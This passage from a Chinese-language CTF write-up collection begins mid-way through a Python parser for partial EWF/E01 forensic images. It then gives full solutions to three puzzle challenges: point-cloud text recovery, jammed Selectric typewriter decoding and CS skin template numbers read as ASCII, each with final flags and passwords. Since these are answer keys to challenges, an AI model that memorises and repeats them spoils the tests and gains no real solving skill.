        while off + DESC_LEN <= self.size:
            buf = self._read_at(off, DESC_LEN)
            if len(buf) < DESC_LEN:
                break
            typ, nxt, ssz, pad, chk = struct.unpack(DESC, buf)
            t = typ.rstrip(b"\x00").decode("latin1")
            sect.append((off, t, nxt, ssz))
            if t == "done" or t == "next":
                break
            if nxt <= off or nxt == 0xffffffffffffffff:
                break
            off = nxt
        self.sections = sect
        # pair sectors with the following table
        media_chunk_idx = 0
        for idx, (off, t, nxt, ssz) in enumerate(sect):
            if t != "sectors":
                continue
            # complete sectors section?
            if off + ssz > self.size:
                break
            # find following table section
            nxt_off = nxt
            tbl = None
            if idx + 1 < len(sect) and sect[idx + 1][0] == nxt_off and sect[idx + 1][1] == "table":
                tbl = sect[idx + 1]
            if tbl is None:
                break
            toff, tt, tnxt, tsz = tbl
            if toff + tsz > self.size:
                break
            data_off = toff + DESC_LEN
            data_len = tsz - DESC_LEN
            hdr = self._read_at(data_off, 24)
            if len(hdr) < 24:
                break
            count = struct.unpack("<I", hdr[0:4])[0]
            base = struct.unpack("<Q", hdr[8:16])[0]
            if 24 + 4 * count > data_len:
                break
            raw = self._read_at(data_off + 24, 4 * count)
            if len(raw) < 4 * count:
                break
            offs = struct.unpack("<%dI" % count, raw)
            for i, rel in enumerate(offs):
                fo = base + rel
                if fo + CHUNK + 4 > self.size:
                    continue
                self.chunks.append((media_chunk_idx * CHUNK, fo, off))
                media_chunk_idx += 1
            # account for any chunks that were beyond EOF within this section
            media_chunk_idx += 0  # offsets processed above
        self.nchunks = len(self.chunks)
        self.media_avail = self.nchunks * CHUNK

    def read(self, off, length):
        out = bytearray()
        pos = off
        while length > 0:
            ci = pos // CHUNK
            co = pos % CHUNK
            if ci >= self.nchunks:
                break
            moff, foff, _ = self.chunks[ci]
            n = min(CHUNK - co, length)
            data = self._read_at(foff + co, n)
            out += data
            if len(data) < n:
                break
            pos += n
            length -= n
        return bytes(out)

if __name__ == "__main__":
    p = PartialEWF(sys.argv[1] if len(sys.argv) > 1 else "YCB_linxiao.E01")
    print("file size", p.size, "sections", len(p.sections))
    print("chunks", p.nchunks, "media available", p.media_avail, "bytes =", p.media_avail / 2**30, "GiB")
    # validate chunk 0 adler
    m, fo, _ = p.chunks[0]
    d = p.read(0, 512)
    print("media[0:16]", d[:16].hex())
    f = open(p.path, "rb"); f.seek(fo + CHUNK); chk = f.read(4); f.close()
    print("stored chk", chk.hex(), "adler of chunk0", struct.pack("<I", zlib.adler32(p.read(0, CHUNK))))
    # validate a random chunk checksum
    import random
    bad = 0
    for i in random.sample(range(p.nchunks), min(50, p.nchunks)):
        m, fo, _ = p.chunks[i]
        data = p.read(m, CHUNK)
        f = open(p.path, "rb"); f.seek(fo + CHUNK); chk = struct.unpack("<I", f.read(4))[0]; f.close()
        if zlib.adler32(data) != chk:
            bad += 1
    print("checksum mismatches in 50 samples:", bad)
    # dump MBR-ish header info
    print("MBR sig:", p.read(510, 2).hex())
    for i in range(4):
        e = p.read(446 + 16 * i, 16)
        if e == b"\x00" * 16:
            continue
        boot, ptype = e[0], e[4]
        lba, nsec = struct.unpack("<II", e[8:16])
        print(f"part{i}: boot={boot:#x} type={ptype:#x} lba={lba} sectors={nsec} off={lba*512} size={nsec*512/2**30:.2f}GiB")
```

NTFS 解析的代码如下。

```python
#!/usr/bin/env python3
"""Parse EWF (E01) sections of a partially-written FTK Imager image."""
import struct, sys, zlib, os

PATH = sys.argv[1] if len(sys.argv) > 1 else "/home/lzl402/Desktop/ctf/DASCTF-2026/misc-lost-memory/YCB_linxiao.E01"
f = open(PATH, "rb")
size = os.path.getsize(PATH)
print(f"file size: {size}")

magic = f.read(13)
print("magic:", magic.hex())
assert magic[:8] == bytes.fromhex("455646090d0aff00")

desc_fmt = "<16sQQ40sI"  # type, next_offset, size, padding, checksum
desc_len = struct.calcsize(desc_fmt)
print("desc len", desc_len)

off = 0x0d
sections = []
for i in range(200):
    if off + desc_len > size:
        print("EOF at", hex(off))
        break
    f.seek(off)
    buf = f.read(desc_len)
    typ, nxt, ssz, pad, chk = struct.unpack(desc_fmt, buf)
    typ_s = typ.rstrip(b"\x00").decode("latin1")
    print(f"section @0x{off:x}: type={typ_s!r} next=0x{nxt:x} size=0x{ssz:x} end=0x{off+ssz:x} chk=0x{chk:08x}")
    sections.append((off, typ_s, nxt, ssz))
    # data area
    dstart = off + desc_len
    dend = off + ssz
    if typ_s in ("header", "volume", "disk", "data", "digest", "hash", "done", "next", "table", "table2", "sectors", "error2"):
        pass
    if nxt == 0 or nxt <= off or nxt == 0xffffffffffffffff:
        print("chain end")
        break
    off = nxt
```

### Chronos Vault

Chronos Vault 是一道三维高斯点云分析题。题目提供一份点云数据和一个形变网络，最终 flag 为 4DGS_i5\_@\_gr3at_7echn0lo9y。解题关键是从经过空间变换的高斯点云中恢复二维像素排列，再利用球谐系数的局部一致性提取文字；虽然题目材料包含形变网络，但最终可以直接处理点云数据，不必搭建完整的四维高斯渲染环境。

点云文件使用小端二进制格式，头部声明八万个顶点，每个顶点包含 62 个单精度属性，除位置与法线外，还有三阶直流系数、45 项高阶球谐系数、不透明度、三个尺度参数与四个旋转参数，这是高斯点云的典型布局。读取时找到头部结束标记，把后面的字节按小端单精度解析并重排为八万行、62 列的数组。形变网络本身是压缩包容器，检查其中的序列化数据可以看到时间编码、网格与位置、尺度、旋转、不透明度及球谐系数的形变输出头；初期尝试恢复网络计算并扫描时间，但普通投影中碎片重叠明显，无法直接读出完整文字，于是转向点云本身的规则结构。

统计位置后发现绝大多数点的 z 坐标集中在六个区间，分别以负五、负三、负一、正一、正三、正五为中心，每个区间 11760 个点，六组共 70560 个点，剩余 9440 个点位于零附近，属于干扰点，可以先排除。直接把每组投影到平面会看到弯曲交错的条带；对每组建立近邻图后结构变得明确：每个点与最近的四个其他点相连，按无向图求连通分量，恰好得到七个分量，每个分量 1680 个点。近邻查询返回包含自身，因此取五个结果并去掉第一个；邻居过多会把相邻层连接起来。1680 可以分解为多种矩形尺寸，进一步统计同层近邻的 z 差值会出现重复次数很高的峰，提示 z 坐标来自二维整数格点的线性组合 z 等于中心加 a 乘 u 加 b 乘 v。对矩形尺寸拟合后，u 取 0 到 59、v 取 0 到 27，即 60×28 的排列能把误差降到浮点精度附近；六组拟合出的步长约为负五层 0.00453154 与 0.01180358、负三层 0.00733544 与 0.00307018、负一层 0.00804145 与 0.00541510、正一层 0.00977055 与 0.00176477、正三层 0.01215815 与 0.00327025、正五层 0.00874569 与 0.00303881，格点拟合均方根误差都在 10 的负 6 次方量级。求解时先把实测 z 减去该层最小值并排序，再与预测格点值的排序结果比较，以两者均方差最小为目标，从近邻高频差值取初值并用最小二乘优化，同时要求 59a 加 27b 约等于 z 的跨度；得到步长后，利用排序对应关系把原始点索引填回 28×60 数组，从而绕过 x、y 方向的弯曲投影。七层的质心近似沿直线分布，对质心做奇异值分解并按主轴排序，可以找到两端的层。

恢复像素排列后，直接把直流系数转成 RGB 仍有较多噪声，但已经可以看到文字轮廓。观察发现文字内部相邻点的球谐系数比较一致，而背景点之间差异更大，因此不需要选定观察方向求完整球谐颜色，可以直接用系数向量的邻域距离提取文字。对每个像素取三项直流系数和 45 项高阶系数组成 48 维向量，分别计算它与上下左右四个邻居的欧氏距离，将四个距离排序后取最小两个的平均作为灰度响应；这样文字内部至少有部分邻居保持一致，响应较低显示为深色，背景响应较高。对最外侧两层分别计算并取平均可以提高可读性，显示时把结果除以 15 并截断到 0 到 1，再用最近邻插值放大。六块图像恢复后，根据文字方向进行翻转和拼接，第三组需要上下翻转，第五组需要左右翻转，从左到右的顺序为 3、0、5、1、4、2；字符会跨越图块边界，因此应先拼接完整图像再辨认文字。拼接后读出的 flag 为 4DGS_i5\_@\_gr3at_7echn0lo9y。

本题的关键代码、脚本与验证输出如下。

```latex
4DGS_i5_@_gr3at_7echn0lo9y
```

```bash
unzip -l chronos_vault_handout.zip
unzip chronos_vault_handout.zip -d handout
file handout/*
```

```latex
point_cloud.ply    19841530 bytes
deformation.pth    16225773 bytes
```

```python
_, near = cKDTree(xyz).query(xyz, k=5)
graph = coo_matrix(
    (np.ones(len(xyz) * 4),
     (np.repeat(np.arange(len(xyz)), 4), near[:, 1:].ravel())),
    shape=(len(xyz), len(xyz)),
)
count, labels = connected_components(graph)
```

```latex
z(u, v) = c + a*u + b*v
```

```latex
最小化 mean((sort(a*u + b*v) - sort(z - min(z)))²)
```

```latex
59*a + 27*b ≈ max(z) - min(z)
```

```latex
d₁, d₂, d₃, d₄ = 四个邻域距离
E = (最小距离 + 次小距离) / 2
```

```latex
[3, 0, 5, 1, 4, 2]
```

```python
import sys
import zipfile
from pathlib import Path

import numpy as np
from PIL import Image
from scipy.optimize import least_squares
from scipy.sparse import coo_matrix
from scipy.sparse.csgraph import connected_components
from scipy.spatial import cKDTree


def read_ply(archive):
    with zipfile.ZipFile(archive) as z:
        data = z.read('point_cloud.ply')
    end = data.index(b'end_header\n') + len(b'end_header\n')
    header = data[:end].decode('ascii').splitlines()
    names = [s.split()[-1] for s in header if s.startswith('property ')]
    count = int(next(s.split()[-1] for s in header if s.startswith('element vertex ')))
    return np.frombuffer(data, '<f4', offset=end).reshape(count, len(names))


def recover_tile(p, center):
    ids = np.flatnonzero(abs(p[:, 2] - center) < .6)
    xyz = p[ids, :3]
    _, near = cKDTree(xyz).query(xyz, k=5)
    graph = coo_matrix((np.ones(len(ids)*4),
                       (np.repeat(np.arange(len(ids)), 4), near[:, 1:].ravel())),
                      shape=(len(ids), len(ids)))
    count, labels = connected_components(graph)
    assert count == 7 and np.all(np.bincount(labels) == 1680)

    # 每层的 z 为二维格点的线性组合，u=0..59，v=0..27。
    # 从近邻点 z 差值的高频峰中寻找格点步长。
    sample = xyz[labels == 0]
    _, near = cKDTree(sample).query(sample, k=9)
    dz = abs(sample[near[:, 1:], 2] - sample[:, None, 2])
    steps, counts = np.unique(dz.round(5), return_counts=True)
    steps = steps[np.argsort(counts)[-18:]]
    values = np.sort(sample[:, 2].astype('f8') - float(sample[:, 2].min()))
    u, v = np.meshgrid(np.arange(60), np.arange(28))

    def residual(c):
        return np.sort((c[0]*u + c[1]*v).ravel()) - values

    fits = []
    for a in steps:
        for b in steps:
            if abs(a*59 + b*27 - values[-1]) < .003:
                fit = least_squares(residual, [a, b])
                fits.append((float(np.mean(fit.fun**2)), fit.x))
    loss, coeff = min(fits, key=lambda item: item[0])
    assert loss < 1e-10, (center, loss)
    target_order = np.argsort((coeff[0]*u + coeff[1]*v).ravel())

    centers = np.array([xyz[labels == k].mean(0) for k in range(7)])
    _, _, axes = np.linalg.svd(centers - centers.mean(0))
    layer_order = np.argsort(centers @ axes[0])
    layers = []
    for k in layer_order:
        group = ids[labels == k]
        grid = np.empty(1680, dtype=int)
        grid[target_order] = group[np.argsort(p[group, 2])]
        layers.append(grid.reshape(28, 60))
    print(f'z={center:+d}: 7 layers, 60x28 pixels, lattice RMS={loss**.5:.2g}')
    return np.stack(layers)


def main():
    p = read_ply(sys.argv[1] if len(sys.argv) > 1 else 'chronos_vault_handout.zip')
    tiles = [recover_tile(p, z) for z in [-5, -3, -1, 1, 3, 5]]
    # 根据恢复出的文字确定图块方向和拼接顺序。
    tiles[3] = tiles[3][:, ::-1, :]
    tiles[5] = tiles[5][:, :, ::-1]
    grid = np.concatenate([tiles[k] for k in [3, 0, 5, 1, 4, 2]], axis=2)

    # 文字内部的球谐系数具有局部一致性，背景系数变化较大。
    # 使用最外侧两层的邻域差异提取文字。
    surfaces = []
    for layer in [0, 6]:
        features = p[grid[layer], 6:54].astype('f8')
        differences = [np.linalg.norm(features - np.roll(features, (dy, dx), axis=(0, 1)), axis=-1)
                       for dy, dx in [(0, 1), (0, -1), (1, 0), (-1, 0)]]
        surfaces.append(np.sort(differences, axis=0)[:2].mean(0))
    energy = np.mean(surfaces, axis=0)
    pixels = (np.clip(energy / 15, 0, 1)*255).astype('uint8')
    output = Path('flag.png')
    Image.fromarray(pixels).resize((2880, 224), Image.Resampling.NEAREST).save(output)
    print(f'Recovered image: {output.resolve()}')


if __name__ == '__main__':
    main()
```

### Jammed

Jammed 是一道打字机机械编码题。题目给出的条目格式为两位序号、五位流水码和两位片段，序号从 01 到 24，流水码与片段只包含小写字母和数字；把条目按原始序号排序，再连接每条记录的末尾两位，即可得到宝藏压缩包的密码。题目提供两页记录，第一页标有记录 A，第二页标有记录 B，另有密码的 SHA-256 和加密压缩包。

A 页的序号变成了 xl、xk、xh 等字符，B 页的前两位仍可识别为 01 到 24，但顺序被打乱。两页中每条记录都是 11 个字符，符合原始格式的总长度；原本的分隔符也可能发生变换，因此不能直接按斜线切分，而应按固定位置读取：前两位是序号，第四至第八位是流水码，最后两位是片段。题目名与描述指向 IBM Selectric 打字机的机械卡死。Selectric 使用字球，通过倾斜和旋转选择字符，倾斜位置由两个位 T1、T2 控制，倾斜行号等于 T1 加两倍 T2。对照标准美式 88 字符字球位置表，未按 Shift 的字符在倾斜行与旋转列上的排列为：第 0 行是 1、3、7、8、4、z、2、5、6、0、9，第 1 行是 x、u、d、c、l、t、n、e、k、h、b，第 2 行是 m、v、r、a、o、二分之一、点、单引号、i、s、w，第 3 行是 g、f、分号、逗号、斜线、j、等号、p、q、y、减号，列从 R 减 5 到 R 加 5。

两页记录分别对应两种卡死状态，旋转位置保持不变：A 页的 T1 固定为 1，行号等于原始行号按位或 1；B 页的 T2 固定为 0，行号等于原始行号按位与取反 2。A 页因此只输出第 1、3 行的字符，B 页只输出第 0、1 行；B 页中数字都在第 0 行，所以序号不变，原始分隔符斜线位于第 3 行、R 减 1 列，在 B 页变成同列第 1 行的 l，这也解释了 B 页看起来像一串没有分隔符的字符。A 页的数字变换为原数字 0 到 9 分别输出 h、x、n、u、l、e、k、d、c、b，利用这张表反查 A 页每行的前两位即可恢复序号，例如 xl 对应 14、hx 对应 01、nh 对应 20。两页保留的信息互补，A 页保留原始 T2，B 页保留原始 T1，因此原始行号等于 A 页行号按位与 2 再或上 B 页行号按位与 1；要求两个输出字符位于同一旋转列，就能恢复原字符。识别图片时数字 1 与小写 l 容易混淆，可以在 B 页同时保留两个候选，再利用另一页字符的旋转列与原始字符集约束筛选，分隔符位置只允许原字符为斜线，其余位置只允许小写字母和数字，本题所有位置都能筛出唯一字符。

按序恢复后得到 24 条记录，连接末尾片段得到 48 位密码 wma1w103x91iek5fq8891iapj3ow03k5i2r02ap13ul28dc4。题目材料中给出的 SHA-256 与实际密码的 UTF-8 哈希不一致，但该密码可以成功解密压缩包并读出 flag，错误密码会被解压工具明确拒绝，因此成功解密可以确认密码有效。最终 flag 为 flag{y0u_f0und_th3_treasure_f8427e}。

本题的关键代码、脚本与验证输出如下。

```bash
unzip -l Jammed.zip
unzip -o Jammed.zip -d extracted
```

```latex
r = T1 + 2 × T2
```

```latex
A 页：T1 固定为 1，即 rA = r | 1
B 页：T2 固定为 0，即 rB = r & ~2
```

```latex
r = (rA & 2) | (rB & 1)
```

```latex
A：hx/l;tb-/-g
B：01l17z99l91
```

```latex
01/lrz9w/wm
02/0oorg/a1
03/ckbnq/w1
04/8db91/03
05/ieghg/x9
06/hdj7u/1i
07/91kml/ek
08/esh5f/5f
09/cil1y/q8
10/oip9w/89
11/oc6og/1i
12/srfcm/ap
13/htyb4/j3
14/19xey/ow
15/p3sm8/03
16/s1vg7/k5
17/j1zyw/i2
18/2yw2n/r0
19/vx20o/2a
20/clntx/p1
21/gr8xj/3u
22/f4a3f/l2
23/ppshm/8d
24/xr0xp/c4
```

```latex
wm a1 w1 03 x9 1i ek 5f q8 89 1i ap j3 ow 03 k5 i2 r0 2a p1 3u l2 8d c4
```

```latex
wma1w103x91iek5fq8891iapj3ow03k5i2r02ap13ul28dc4
```

```latex
cfde9ebf5fb607b0c8d54abd707fa622fd8a246032d8b06d528e684f6238dcab
```

```latex
0193fddd8eb9518d1c897b1804083891f715056031670b78decfe5f89b35c163
```

```bash
7z x -y \
  -pwma1w103x91iek5fq8891iapj3ow03k5i2r02ap13ul28dc4 \
  -oextracted/treasure extracted/treasure.zip
cat extracted/treasure/flag.txt
```

```latex
flag{y0u_f0und_th3_treasure_f8427e}
```

### skin secret

skin secret 是一道图片语义分析题。题目提供 29 张图片，文件名从 1.png 到 29.png，没有其他文件；初步检查 PNG 的数据块、校验和、解压长度与文件尾，只看到正常的图像块，没有文本元数据，也没有附加载荷，进一步检查 RGB 通道低位平面并按行、按列、单通道以及不同通道顺序提取，均未得到可读内容，于是转向图片本身的语义信息。

观察到第 2 张与第 19 张都是 M4A4 的破晓皮肤，但枪身上的太阳与云纹位置不同。同一种皮肤出现不同花纹位置，提示题目使用了模板编号。在 CS 皮肤中需要区分涂装编号与模板编号：涂装编号标识一种皮肤，例如 M4A4 破晓的涂装编号为 471；模板编号决定同一种皮肤的花纹分布，第 2 张与第 19 张的模板编号分别为 87 与 55。直接对涂装编号做 ASCII 转换没有结果，而模板编号可以通过花纹与参考图匹配来恢复。识别时需要放大原图核对，不能仅凭缩略图主色判断，例如第 8 张是沙漠之鹰热处理，第 14 张是 USP 消音版沉睡药水，第 22 张是 AWP POP AWP，第 25 张是 SSG 08 威胁检测。

逐张识别武器与皮肤并对照模板图库后，29 张图对应的模板编号依次为 71、87、72、84、123、67、83、95、49、115、95、116、104、51、95、98、101、115、55、95、70、80、53、95、71、64、77、69、125。把这些编号按图片顺序作为 ASCII 码转换，得到 GWHT{CS_1s_th3_bes7_FP5_G@ME}，其中 71 对应 G、87 对应 W、72 对应 H、84 对应 T、123 对应左花括号，其余依次还原即可。本题的关键是把图片语义从伪装中剥离出来，识别出同皮肤不同花纹对应的模板编号，并把编号直接作为 ASCII 码使用。

本题的关键代码、脚本与验证输出如下。

```bash
unzip -l CS.zip
```

```python
seeds = [71, 87, 72, 84, 123, 67, 83, 95, 49, 115, 95, 116, 104, 51, 95, 98, 101, 115, 55, 95, 70, 80, 53, 95, 71, 64, 77, 69, 125]

print("".join(chr(seed) for seed in seeds))
```

```latex
GWHT{CS_1s_th3_bes7_FP5_G@ME}
```
